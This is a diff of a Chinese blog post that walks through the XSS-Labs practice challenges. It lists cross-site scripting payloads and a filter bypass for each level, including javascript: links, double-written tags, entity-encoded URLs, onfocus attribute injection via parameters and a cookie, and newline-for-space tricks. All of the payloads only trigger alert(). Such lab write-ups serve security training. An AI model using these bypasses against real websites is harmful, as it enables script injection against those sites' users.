@@ -2,9 +2,10 @@
 title: Xss-Labs通过文档
 author: Kilm0r
 description: "xss注入备忘录"
-pubDate: 2025-05-08
+pubDate: 2025-06-06
 tags: ["安全", "xss", "渗透"]
 ---
+
 <h1 id="Exg7d">常用payload：</h1>
 ```javascript
 <script>alert("xss")</script>
@@ -29,9 +30,6 @@ tags: ["安全", "xss", "渗透"]
  
 <details open ontoggle="alert()">  (chrome & opera only)
 ```
-
-  
- 
 
 <h2 id="J5B4V">开局：</h2>
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748692622630-b9fc59c2-4b10-4248-bd55-a68eb7cc474c.png)
@@ -82,8 +80,6 @@ tags: ["安全", "xss", "渗透"]
 
 <script>alert("xss")</script>
 
-
-
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693476074-a0f7a5a9-8875-45e6-9e14-4d95c0890000.png)
 
 <input name="keyword" value="&lt;scr_ipt&gt;alert(" xss")<="" script="">
@@ -92,16 +88,13 @@ tags: ["安全", "xss", "渗透"]
 
 源码处发现使用str_replace函数，<script>转换为<scr_ipt> on转换为o_n
 
-
-
 使用a标签绕过script与on标签
 
 ```javascript
 "/><a href=javascript:alert()>a-alert</a><"
 ```
 
-  
- ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693680555-c201b65d-247c-4929-87aa-36c18713ed87.png)
+![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693680555-c201b65d-247c-4929-87aa-36c18713ed87.png)
 
 <h1 id="BKN09">第六关：</h1>
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693701767-90ca1802-b407-4f97-8137-a30fbc7bf788.png)
@@ -127,8 +120,7 @@ tags: ["安全", "xss", "渗透"]
 
 这里我们使用双写绕过，删掉中间标签的同时剩下的标签还能组成新的标签
 
-![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694198203-e8bf13ec-3350-460f-b2d4-b6276c9935c7.png)  
-
+![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694198203-e8bf13ec-3350-460f-b2d4-b6276c9935c7.png)
 
 <h1 id="BGo1C">level 8</h1>
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694247444-41d5a63e-8132-4e5c-a26e-61d780ed37b2.png)
@@ -145,10 +137,7 @@ tags: ["安全", "xss", "渗透"]
 &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
 ```
 
-  
- ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694338825-d8863254-eeb2-4f51-8daa-7264c0890927.png)
-
-
+![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694338825-d8863254-eeb2-4f51-8daa-7264c0890927.png)
 
 <h1 id="Cdj7L">level 9</h1>
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694355285-c912d8b4-933b-48fe-9a69-312bbf04f5a7.png)
@@ -177,9 +166,6 @@ tags: ["安全", "xss", "渗透"]
 ?t_sort=" onfocus=javascript:alert() type="text
 ```
 
-  
- 
-
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694631079-3b2450d8-5344-4bd5-bbdb-729226ab3a06.png)
 
 <h1 id="RTNrK">Level 11</h1>
@@ -193,8 +179,6 @@ tags: ["安全", "xss", "渗透"]
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694841769-417a94fa-41c0-4d84-acf4-f7377dd51e60.png)
 
-
-
 <h1 id="J7KcJ">Level 12</h1>
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694888845-b90d578a-b567-467e-894a-117bc512d7bf.png)
 
@@ -206,29 +190,24 @@ tags: ["安全", "xss", "渗透"]
 " onfocus=javascript:alert() type="text
 ```
 
-  
- ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695013999-b62c8694-a878-4c37-93c1-29d3c8f7eb75.png)
+![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695013999-b62c8694-a878-4c37-93c1-29d3c8f7eb75.png)
 
 <h1 id="HRe86">Level 13</h1>
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695051874-f0a0eafa-1492-4e96-8cc0-b64368bbdcbf.png)
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695066091-e217416b-4407-49e2-9a2a-31df46b92c9e.png)
 
-源码处得知接收俩个参数keyword与t_sort同时过滤<>,使用$_COOKIE["user"]，接收浏览器cookie信息
+源码处得知接收俩个参数keyword与t_sort同时过滤<>,使用$\_COOKIE["user"]，接收浏览器cookie信息
 ，同上继续使用onfocus函数，插入cookie位置
+
 ```javascript
 " onfocus=javascript:alert() type="text
 ```
-
-  
- 
 
 <h1 id="SHLf9">level 14</h1>
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695305217-f966b248-62e0-4332-9fde-d73347f68eba.png)
 
 这关目前做不了，含义为跳转该网站，在该网站上传存在xss代码图片，跳转到该网站后弹窗，目前该网站已经关闭，本关略过
-
-
 
 <h1 id="Y25Dr">Level 15</h1>
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695440534-a4146bd1-88fc-4ffc-a51a-b48c0650eed2.png)![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695480191-141e2026-52c8-486a-952e-52b3e55bee04.png)
@@ -241,8 +220,7 @@ tags: ["安全", "xss", "渗透"]
 ?src='level1.php?name=<img src=XXX onmouseover=alert()>'
 ```
 
-  
- ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695587337-7f1c7f5c-6190-4e10-8441-7c07290c5aa5.png)
+![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695587337-7f1c7f5c-6190-4e10-8441-7c07290c5aa5.png)
 
 <h1 id="cUxQZ">Level 16</h1>
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695623584-86f575e2-4c87-4fa2-be1f-92c173072d09.png)
@@ -252,6 +230,3 @@ tags: ["安全", "xss", "渗透"]
 <font style="color:rgb(77, 77, 77);">空格可以用回车来代替绕过，回车的url编码是%0a，再配合上不用/的<img>、<details>、<svg>等标签</font>
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695702619-ff7d7621-4354-46e5-80ac-c50273007946.png)![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695756054-19202322-fc4e-4e19-94f0-1e1c1a1bb210.png)
-
-
-
